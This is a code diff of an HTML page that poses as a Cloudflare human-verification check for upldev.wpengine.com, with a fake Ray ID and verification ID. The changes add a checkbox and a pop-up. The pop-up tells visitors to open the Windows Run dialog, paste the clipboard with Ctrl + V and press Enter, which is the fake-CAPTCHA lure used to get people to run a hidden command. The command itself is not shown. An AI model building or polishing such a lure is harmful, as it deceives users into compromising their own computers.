@@ -8,36 +8,51 @@
 </head>
 <body>
     <div class="verification-container">
-        <div class="loader-section">
-            <div class="loader"></div>
-            <p class="loading-text">Verifying you are human. This may take a few seconds.</p>
+        <div class="domain-name">upldev.wpengine.com</div>
+        
+        <div class="verification-text">
+            Verifying you are human. This may take a few seconds.
         </div>
 
-        <div class="verification-steps">
-            <h2>Cloudflare</h2>
-            <h3>Security by Cloudflare Verification steps</h3>
-            
-            <p>Let us know you're human, please complete steps:</p>
-            <ol>
-                <li>Press & hold the Windows Key + R</li>
-                <li>In the verification window, press Ctrl + V</li>
-                <li>Press Enter on the keyboard to complete</li>
-            </ol>
+        <div class="cloudflare-checkbox">
+            <label>
+                <input type="checkbox" name="human-verification">
+                <span class="checkmark"></span>
+                Verify you are human
+                <span class="cloudflare-logo">Cloudflare</span>
+            </label>
+        </div>
 
-            <div class="agreement-section">
-                <p>You will observe and agree:</p>
-                <p class="verification-id">I am not a robot -</p>
+        <div class="verification-popup" style="display: none;">
+            <div class="popup-header">
+                <span class="popup-title">Security by Cloudflare</span>
+                <span class="popup-subtitle">Verification steps</span>
+            </div>
+            
+            <div class="popup-content">
+                <p>Let us know you're human, please complete steps:</p>
+                <ol>
+                    <li>Press & hold the Windows Key + R</li>
+                    <li>In the verification window, press Ctrl + V</li>
+                    <li>Press Enter on the keyboard to complete</li>
+                </ol>
+
+                <div class="popup-agreement">
+                    <p>You will observe and agree:</p>
+                    <p class="verification-id">I am not a robot - Cloudflare Verification ID: 91923b</p>
+                </div>
+
+                <button class="verify-button">Verify</button>
             </div>
         </div>
 
-        <div class="domain-section">
-            <h1 id="domain-name">Loading...</h1>
-            <p>needs to review the security of your connection before proceeding.</p>
+        <div class="security-message">
+            upldev.wpengine.com needs to review the security of your connection before proceeding.
         </div>
 
-        <div class="footer">
-            <p>Ray ID: <span id="ray-id">91923b78ba53249b</span></p>
-            <p>Performance & security by Cloudflare</p>
+        <div class="page-footer">
+            <div class="ray-id">Ray ID: <code>91923b78ba53249b</code></div>
+            <div class="cloudflare-branding">Performance & security by Cloudflare</div>
         </div>
     </div>
 
